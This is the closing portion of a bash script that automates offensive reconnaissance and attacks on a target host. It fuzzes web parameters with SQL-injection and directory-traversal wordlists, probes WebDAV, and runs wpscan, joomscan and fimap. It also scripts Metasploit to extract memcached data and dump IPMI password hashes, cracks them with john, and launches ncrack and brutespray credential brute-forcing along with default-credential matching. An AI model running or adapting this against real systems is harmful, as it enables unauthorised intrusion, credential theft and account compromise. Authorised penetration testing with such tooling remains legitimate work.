    sort -u "$RECONDIR"/tmp/${TARGET}.FUZZ.raw |grep "$TARGET" > "$RECONDIR"/tmp/${TARGET}.FUZZ

    IFS=$'\n'
    for line in $(cat "$RECONDIR"/tmp/${TARGET}.FUZZ 2>/dev/null)
    do
        IFS=' '
        post=$(echo $line|awk '{print $1}')
        url=$(echo $line|awk '{print $2}')
        #url=${url//\&/\\&}
        wfuzzfile=$(echo ${url//\//,} |cut -d',' -f1-4 |cut -d';' -f1)
        #wfuzzfile=${wfuzzfile// /,}
        #wfuzzfile=${wfuzzfile//-/_}
        #wfuzzfile=${wfuzzfile//\"/}
        #wfuzzfile=${wfuzzfile//\&/_}

        if [[ $post != "none" ]]
        then
            post="-d \"$post\""
        else
            post=''
        fi
        $TIMEOUT 300 wfuzz -o html --hc 404 -w /usr/share/wfuzz/wordlist/vulns/sql_inj.txt $post "$url" \
            >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.sql.wfuzz.${i}.html 2>&1
        $TIMEOUT 300 wfuzz -o html --hc 404 -w /usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt $post "$url" \
            >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.dtnix.wfuzz.${i}.html 2>&1
        $TIMEOUT 300 wfuzz -o html --hc 404 -w /usr/share/wfuzz/wordlist/vulns/dirTraversal-win.txt $post "$url" \
            >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.dtwin.wfuzz.${i}.html 2>&1
        # sometimes timeout command forks badly on exit
        pkill -t $TTY -f wfuzz
        let i++
    done

    for file in "$RECONDIR"/${TARGET}.wfuzz/raws/*.wfuzz.*.html
    do
        # change dark theme to light theme
        cat "$file" \
            |sed -e 's/bgcolor=#000000/bgcolor=#FFFFFF/g' \
            |sed -e 's/text=#FFFFFF/text=#000000/g' \
            >> ${file}.1 2>&1
            mv -f ${file}.1 ${file} 2>&1

        ignore=$(cat "$file" \
            |egrep -E "\d*L" \
            |sed -e 's/.*[^0-9]\([0-9]*L\).*[^0-9]\([0-9]*W\).*/\1 \2/'\
            |sort \
            |uniq -c \
            |sort -k1 -n \
            |tail -1 \
            |awk '{print $2".*"$3}')

        filename=${file##*/}
        cat "$file" \
            |egrep -v "$ignore" \
            >> "$RECONDIR"/${TARGET}.wfuzz/${filename%%.wfuzz.*.html}.wfuzz.html 2>&1
        egrep -q "00aa00" "$RECONDIR"/${TARGET}.wfuzz/${filename%%.wfuzz.*.html}.wfuzz.html \
            || rm -f "$RECONDIR"/${TARGET}.wfuzz/${filename%%.wfuzz.*.html}.wfuzz.html
    done

    return 0
}
################################################################################

################################################################################
function mechDumpURLs()
{
    local url
    local output

    for url in $(cat "$RECONDIR"/${TARGET}.urls \
        |egrep -v '/./$|/../$' \
        |egrep -v '/\?')
    do
        output=$($TIMEOUT 60 mech-dump --absolute --forms "$url" 2>/dev/null)
        if [[ ${#output} -gt 0 ]]
        then
            echo "$BORDER" >> "$RECONDIR"/${TARGET}.mech-dump
            echo "URL: $url" >> "$RECONDIR"/${TARGET}.mech-dump
            echo "$output" >> "$RECONDIR"/${TARGET}.mech-dump
        fi
        # sometimes timeout command forks badly on exit
        pkill -t $TTY -f mech-dump
    done

    return 0
}

################################################################################

################################################################################
function davScanURLs()
{
    local url
    local port
    local output

    for url in $(cat "$RECONDIR"/${TARGET}.urls 2>/dev/null \
        |sed -e 's|\(^.*://.*/\).*|\1|'\
        |egrep -v '/.*/./$|/.*/../$'\
        |sort -u )
    do
        # try multiple DAV scans.  None of these are 100% reliable, so try several.
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.davtest 
        echo "TESTING $url" >> "$RECONDIR"/${TARGET}.davtest 
        $TIMEOUT 90 davtest -cleanup -url "$url" 2>&1|grep SUCCEED >> "$RECONDIR"/${TARGET}.davtest
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.davtest 

        echo "$BORDER" >> "$RECONDIR"/${TARGET}.cadaver 
        echo "TESTING $url" >> "$RECONDIR"/${TARGET}.cadaver 
        echo ls | $TIMEOUT 10 cadaver "$url" 2>&1 \
            |egrep -v 'command can only be used when connected to the server.|^Try running|^Could not access|^405 Method|^Connection to' \
            >> "$RECONDIR"/${TARGET}.cadaver
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.cadaver 

        port=$(getPortFromUrl "$url")
        output=$($TIMEOUT 90 nmap -p $port -Pn \
            --script http-webdav-scan \
            --script-args "http-webdav-scan.path=/${url#*/*/*/}" \
            ${TARGET} 2>&1 )
        if echo $output |grep -q http-webdav-scan:
        then
            echo "$BORDER" >> "$RECONDIR"/${TARGET}.nmap-webdav 
            echo "TESTING $url" >> "$RECONDIR"/${TARGET}.nmap-webdav
            echo "$output" >>"$RECONDIR"/${TARGET}.nmap-webdav
            echo "$BORDER" >> "$RECONDIR"/${TARGET}.nmap-webdav 
        fi
    done
    grep -q SUCCEED "$RECONDIR"/${TARGET}.davtest 2>/dev/null \
        || rm -f "$RECONDIR"/${TARGET}.davtest >/dev/null 2>&1
    grep -q succeeded "$RECONDIR"/${TARGET}.cadaver 2>/dev/null \
        || rm -f "$RECONDIR"/${TARGET}.cadaver >/dev/null 2>&1

    return 0
}
################################################################################

################################################################################
function exifScanURLs()
{
    local url
    local port
    local output
    local exifreport="$RECONDIR"/${TARGET}.exif.html

    for url in $(cat "$RECONDIR"/tmp/${TARGET}.spider.raw 2>/dev/null \
        |egrep -i '\.(jpg|jpeg|tif|tiff|wav)$')
    do   
        # download files to /tmp because my /tmp is tmpfs (less i/o)
        $TIMEOUT 60 wget -q --no-check-certificate -D $TARGET -O /tmp/${TARGET}.exiftestfile "$url"
        if exif /tmp/${TARGET}.exiftestfile >/dev/null 2>&1 
        then 
            echo "<hr>" >> $exifreport
            echo "<!-- $BORDER -->" >> $exifreport
            echo "<a href='$url'>$url</a>" >> $exifreport
            echo "<pre>" >> $exifreport
            exif /tmp/${TARGET}.exiftestfile 2>/dev/null \
                |egrep -v '^Orientation|^X-Resolution|^Y-Resolution|^Resolution Unit|^YCbCr Positioning|^Compression|^X-Resolution|^Y-Resolution|^Resolution Unit|^Exposure Time|^F-Number|^ISO Speed Ratings|^Exif Version|^Components Configura|^Compressed Bits per|^Shutter Speed|^Aperture|^Exposure Bias|^Maximum Aperture Val|^Metering Mode|^Flash|^Focal Length|^FlashPixVersion|^Color Space|^Pixel X Dimension|^Pixel Y Dimension|^Focal Plane X-Resolu|^Focal Plane Y-Resolu|^Focal Plane Resoluti|^Sensing Method|^Image Width|^Image Length|^Bits per Sample|^Photometric Interpre|^Samples per Pixel' \
                >> $exifreport
            echo "</pre>" >> $exifreport
        fi   
        rm -f /tmp/${TARGET}.exiftestfile >/dev/null 2>&1 
    done 

#    for url in $(cat "$RECONDIR"/${TARGET}.urls 2>/dev/null \
#        |egrep -v '/./$|/../$' |sed -e 's|\(^.*://.*/\).*|\1|'|sort -u)
#    do
#        port=$(getPortFromUrl "$url")
#        output=$($TIMEOUT 60 nmap -T3 -p $port \
#            --script=http-exif-spider \
#            --script-args "http-exif-spider.url=/${url#*/*/*/}" \
#            $TARGET 2>&1)
#        if echo $output |grep -q http-exif-spider:
#        then
#            echo "$output" >> ${TARGET}.nmap-http-exif-spider
#        fi
#    done

    return 0
}
################################################################################

################################################################################
function getPortFromUrl()
{
    local url=$1
    local port

    port=$(echo $url|sed -e 's/.*:\([[:digit:]]*\)\/.*/\1/')
    if ! echo $port |egrep -q "^[[:digit:]]+$"
    then
        if echo $url |grep -q "^https"
        then
            port=443
        else
            port=80
        fi
    fi

    echo $port
}
################################################################################
function scanURLs()
{
    local url

    screen -dmS ${TARGET}.urlsew.$RANDOM $TIMEOUT 28800 \
        eyewitness --threads 1 -d "$RECONDIR"/${TARGET}.urlsEyeWitness \
        --no-dns --no-prompt --all-protocols -f "$RECONDIR"/${TARGET}.urls

    # run whatweb on top dirs
    for url in $(egrep '/$' "$RECONDIR"/${TARGET}.urls |egrep -v '/./$|/../$')
    do
        if [[ "$(echo $url |grep -o '.' |grep -c '/')" -le 4 ]]
        then
            if ! egrep -q "^$url" "$RECONDIR"/${TARGET}.whatweb 2>/dev/null
            then
                $TIMEOUT 300 whatweb -a3 --color=never "$url" \
                    >> "$RECONDIR"/${TARGET}.whatweb 2>/dev/null
                echo '' >> "$RECONDIR"/${TARGET}.whatweb 2>/dev/null
            fi
        fi
    done

    # run wpscan on first found wordpress
    for url in $(egrep -i 'wordpress|/wp' "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
    do
        echo "Running wpscan on $url"
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
        echo "URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
        $TIMEOUT 900 wpscan -t 10 --follow-redirection --disable-tls-checks -e \
            --no-banner --no-color --batch --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 

        echo "Running wpscan admin crack on $url"
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
        echo "CRACKING ADMIN FOR URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
        $TIMEOUT 900 wpscan -t 3 --disable-tls-checks --wordlist "$RECONDIR"/tmp/passwds.lst \
            --username admin --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1
    done

    # run joomscan on first found joomla
    for url in $(grep -i joomla "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
    do
        echo "Running joomscan on $url"
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
        echo "URL: $url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
        $TIMEOUT 900 joomscan -pe -u "$url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
    done

    # run fimap on anything with php
    for url in $(egrep -i '\.php$' "$RECONDIR"/${TARGET}.urls |awk '{print $1}')
    do
        echo "Running fimap on $url"
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
        echo "URL: $url" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
        $TIMEOUT 300 fimap --force-run -4 -u "$url" 2>&1 \
            |egrep -v '^fimap |^Another fimap|^:: |^Starting harvester|^No links found|^AutoAwesome is done' \
            >> "$RECONDIR"/${TARGET}.fimap
    done

    return 0
}
################################################################################

################################################################################
function memcacheScan()
{
    local cmdfile="$RECONDIR"/tmp/memcached.${port}.metasploit
    local port=$1

    echo "use auxiliary/gather/memcached_extractor" > $cmdfile
    echo "set RHOSTS $TARGET" >> $cmdfile
    echo "set RPORT $TARGET" >> $cmdfile
    echo "run" >> $cmdfile
    echo "exit" >> $cmdfile

    /usr/share/metasploit-framework/msfconsole -n -r $cmdfile -o "$RECONDIR"/${TARGET}.msf.memcached.${port}.out >/dev/null 2>&1

    # strip hex and convert newlines to real newlines
    perl -pi -e 's|\\r\\n|\n|g' "$RECONDIR"/${TARGET}.msf.memcached.${port}.out 
    perl -pi -e 's|\\x..| |g' "$RECONDIR"/${TARGET}.msf.memcached.${port}.out 

    return 0
}
################################################################################

################################################################################
function ipmiScan()
{
    local cmdfile="$RECONDIR"/tmp/ipmi.metasploit

    echo "use auxiliary/scanner/ipmi/ipmi_dumphashes" > $cmdfile
    echo "set RHOSTS $TARGET" >> $cmdfile
    echo "set OUTPUT_HASHCAT_FILE $RECONDIR/${TARGET}.ipmi.hashcat" >> $cmdfile
    echo "set OUTPUT_JOHN_FILE $RECONDIR/${TARGET}.ipmi.john" >> $cmdfile
    echo "run" >> $cmdfile
    echo "exit" >> $cmdfile

    /usr/share/metasploit-framework/msfconsole -n -r $cmdfile >"$RECONDIR"/tmp/msf.ipmi.out 2>&1

    if [[ -f $RECONDIR/${TARGET}.ipmi.john ]]
    then
        john --wordlist=$RECONDIR/tmp/passwds.lst --rules=Single $RECONDIR/${TARGET}.ipmi.john \
            >"$RECONDIR"/tmp/ipmi.john.out 2>&1
        john --show $RECONDIR/${TARGET}.ipmi.john >$RECONDIR/${TARGET}.ipmi.john.cracked 2>&1
    fi

    return 0
}
################################################################################

################################################################################
function crackers()
{
    screen -dmS ${TARGET}.ncrack.$RANDOM -L -Logfile "$RECONDIR"/${TARGET}.ncrack \
        $TIMEOUT 28900 \
        ncrack -iN "$RECONDIR"/${TARGET}.nmap -U "$RECONDIR"/tmp/users.lst \
        -P "$RECONDIR"/tmp/passwds.lst -v -g CL=2,cr=5,to=8h

    screen -dmS ${TARGET}.brutespray.$RANDOM -L -Logfile "$RECONDIR"/${TARGET}.brutespray \
        $TIMEOUT 28900 \
        brutespray --file "$RECONDIR"/${TARGET}.ngrep --threads 2 -c

    return 0
}
################################################################################

################################################################################
function defaultCreds()
{
    local IFS=$'\n'
    local name
    local defpassfile='/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv'
    local logfile="$RECONDIR/${TARGET}.defaultCreds"

    for name in $(cat $defpassfile \
        |dos2unix |cut -d',' -f1 |tr '[A-Z]' '[a-z]' |sed -e 's/"//g' |sort -u)
    do
        # filter out nmap scan initiated because it triggered Sun on sundays
        if cat *.nmap *.whatweb 2>/dev/null |grep -v 'scan initiated' | egrep -qi "\W$name\W" 
        then
            echo "$BORDER" >>$logfile
            echo "FOUND $name" >>$logfile
            echo "" >>$logfile
            egrep -i "\W$name\W" *.nmap *.whatweb >>$logfile 2>/dev/null
            echo "" >>$logfile
            echo "POSSIBLE DEFAULT CREDENTIALS:" >>$logfile
            egrep -i "^$name|^\"$name" $defpassfile >>$logfile
            echo "" >>$logfile
            echo "$BORDER" >>$logfile
        fi
    done

    return 0
}
################################################################################

# record settings to diff for variable leakage
set > /tmp/set1

MAIN $*
stty sane >/dev/null 2>&1

set > /tmp/set2

